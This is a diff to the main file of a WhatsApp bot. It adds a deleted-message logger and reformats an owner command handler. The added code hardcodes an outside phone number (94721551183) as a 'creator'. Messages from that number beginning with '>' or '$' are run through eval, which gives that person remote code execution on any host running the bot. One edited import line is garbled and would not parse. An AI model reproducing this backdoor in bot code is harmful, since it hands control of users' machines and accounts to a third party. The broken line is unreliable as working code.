@@ -32,10 +32,9 @@ const storeDir = path.join(process.cwd(), 'index');
 const express = require("express");
 const util = require("util");
 const axios = require("axios");
-const ytdl = require("ytdl-core");
 const { File } = require("megajs");
 const fetch = require("node-fetch");
-const { ytsearch } = require('@dark-yasiya/yt-dl.js');
+const { ytsearch } = require("yt-search")re('@dark-yasiya/yt-dl.js');
 const config = require("./config");
 const prefix = config.PREFIX;
 const ownerNumber = config.OWNER_NUMBER;
@@ -922,8 +921,22 @@ async function connectToWA() {
       setTimeout(connectToWA, 3000);
     }
   });
-
+  
   sock.ev.on("creds.update", saveCreds);
+//==============================
+  sock.ev.on('messages.update', async updates => {
+    for (const update of updates) {
+      if (update.update.message === null) {
+        console.log("Delete Detected:", JSON.stringify(update, null, 2));
+        await AntiDelete(conn, updates);
+      }
+    }
+  });
+  //============================== 
+          
+  //=============readstatus=======
+        
+sock.ev.on('messages.upsert', async(mek) => {
  mek = mek.messages[0]
     if (!mek.message) return
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
@@ -977,54 +990,55 @@ if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STAT
   const senderNumber = m.sender.split("@")[0];
   const isReact = m.message?.reactionMessage ? true : false;
   const reply = (teks) => {
-    conn.sendMessage(from, { text: teks }, { quoted: mek })
-  }
-  const udp = botNumber.split('@')[0];
-    const ikratos = ('94721551183');
-    let isCreator = [udp, ikratos, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+  conn.sendMessage(from, { text: teks }, { quoted: mek });
+};
 
-    if (isCreator && mek.text.startsWith('>')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = eval(code);
-						if (typeof resultTest === 'object')
-							reply(util.format(resultTest));
-						else reply(util.format(resultTest));
-					} catch (err) {
-						reply(util.format(err));
-					}
-					return;
-				}
-    if (isCreator && mek.text.startsWith('$')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = await eval(
-							'const a = async()=>{\n' + code + '\n}\na()',
-						);
-						let h = util.format(resultTest);
-						if (h === undefined) return console.log(h);
-						else reply(h);
-					} catch (err) {
-						if (err === undefined)
-							return console.log('error');
-						else reply(util.format(err));
-					}
-					return;
-				}
+const udp = botNumber.split("@")[0];
+const ikratos = "94721551183";
+
+let isCreator = [udp, ikratos, config.DEV]
+  .map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net")
+  .includes(mek.sender);
+
+// Eval command (sync code)
+if (isCreator && mek.text.startsWith(">")) {
+  let code = budy.slice(2);
+  if (!code) {
+    reply(`Provide me with a query to run Master!`);
+    return;
+  }
+  try {
+    let resultTest = eval(code);
+    if (typeof resultTest === "object") reply(util.format(resultTest));
+    else reply(util.format(resultTest));
+  } catch (err) {
+    reply(util.format(err));
+  }
+  return;
+}
+
+// Eval command (async code)
+if (isCreator && mek.text.startsWith("$")) {
+  let code = budy.slice(2);
+  if (!code) {
+    reply(`Provide me with a query to run Master!`);
+    return;
+  }
+  try {
+    // Wrap in async IIFE and await it
+    let resultTest = await (async () => {
+      return await eval(code);
+    })();
+
+    let h = util.format(resultTest);
+    if (h === undefined) return console.log(h);
+    else reply(h);
+  } catch (err) {
+    if (err === undefined) return console.log("error");
+    else reply(util.format(err));
+  }
+  return;
+}
       // OWNER REACT
       if (senderNumber.includes("94721551183") && !isReact) {
         const ownerReacts = [
